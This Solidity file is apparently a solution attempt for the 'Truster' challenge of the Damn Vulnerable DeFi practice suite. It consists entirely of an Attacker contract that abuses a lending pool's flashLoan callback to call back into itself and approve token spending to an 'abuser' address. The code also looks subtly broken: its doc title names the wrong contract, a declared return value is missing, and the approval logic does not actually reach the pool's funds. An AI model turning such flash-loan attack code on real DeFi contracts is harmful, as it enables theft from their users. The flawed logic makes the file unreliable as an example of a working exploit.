// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker {
    TrusterLenderPool public immutable pool;
    ERC20 public immutable token;
    address public abuser;
    uint256 amount = 10*10**18;

    constructor(address _pool, address _token, address _abuser) {
        pool = TrusterLenderPool(_pool);
        token = ERC20(_token);
        abuser = _abuser;
    }

    function flashLoan()
        external
        returns (bool)
    {
        bytes memory callData = abi.encodeWithSignature("attack()");
        pool.flashLoan(amount, address(this), address(this), callData);
    }
    function attack() public {
        token.transfer(address(pool), amount);
        token.approve(abuser, amount*2);
    }
}
